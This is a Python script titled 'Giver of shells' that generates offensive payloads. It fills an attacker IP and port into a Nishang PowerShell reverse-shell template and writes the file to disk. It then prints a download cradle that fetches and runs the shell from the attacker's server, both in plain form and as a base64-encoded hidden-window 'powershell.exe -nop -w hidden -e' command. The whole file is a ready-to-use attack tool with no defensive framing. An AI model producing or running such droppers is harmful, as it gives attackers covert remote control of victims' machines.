#!python3

import argparse, base64, os, random, string
# Red - Important information
# Yellow - Notice me, eventually
# Green - Use me, abuse me, try to lose me
from lib import logger

parser = argparse.ArgumentParser(description = "Giver of shells")
parser.add_argument('-i', '--ip-address', help="Attacker IP Address", required=True)
parser.add_argument('-p', '--port', help="Attacker Port")
parser.add_argument('-d', '--directory', help="Directory for generated payloads")
args = parser.parse_args()

if args.ip_address != None:
	ipaddr = args.ip_address

if args.port != None:
	port = args.port
else:
	port = "12345"

if args.directory != None:
	if args.directory.endswith("/"):
		generated_payload_directory = args.directory
	else:
		generated_payload_directory = args.directory + "/"
else:
	generated_payload_directory = "./generated_payloads/"

logger.red_fg("The attacker server is set to %s:%s"  % (ipaddr, port))
logger.red_fg("Writing payloads to %s" % generated_payload_directory)
print()

shell_dictionary = {}

def register_shell(filename, shellcontent):
	shellname = randomString()
	shell_dictionary[filename] = shellname
	set_resource(filename, shellcontent)

def print_shell_dictionary():
	print()
	logger.red_fg("The following payloads were generated:")
	for key, value in shell_dictionary.items():
		print("Shell %s, named %s" % (key, value))

# A base shell to pull
def nishang_powershell():
	nishang_shell = get_resource("resources/Invoke-PowerShellTcp.ps1")
	register_shell("Invoke-PowerShellTcp.ps1", nishang_shell)

# Get a resource
def get_resource(filename):
	resource_data = ""
	with open(filename, "r") as filecontents:
		resource_data = filecontents.read()
		resource_data = resource_data.replace(
				"TEMPLATEIPADDRESS",
				ipaddr
				).replace(
				"TEMPLATEPORT",
				port)
	return resource_data

# Write out a resource
def set_resource(filename, filecontents):
	filename = filename
	if not os.path.exists(generated_payload_directory):
		os.mkdir(generated_payload_directory)
	filename = generated_payload_directory + filename
	destination_file = open(filename, "w")
	destination_file.write(filecontents)
	destination_file.close()

# The base command to pull files from the attackers machine to the victim machine
def raw_dropper(filename):
	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, port, filename)
	return base_payload

def raw_dropper_base64(filename):
	base_payload = raw_dropper(filename)
	base64_base_payload = base64.b64encode(base_payload.encode('utf-16-le')).decode('utf-8')
	return base64_base_payload
	
def manual_dropper():
	logger.red_fg("This is your raw manual dropper")
	logger.yellow_fg(raw_dropper("test"))
	logger.red_fg("This is your raw manual dropper, base64-encoded")
	logger.yellow_fg(raw_dropper_base64("test"))
	logger.red_fg("This is the base payload")
	logger.green_fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64("Invoke-PowerShellTcp.ps1"))
	
def randomString(length=6):
	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

nishang_powershell()
raw_dropper_base64("test")
manual_dropper()
print_shell_dictionary()
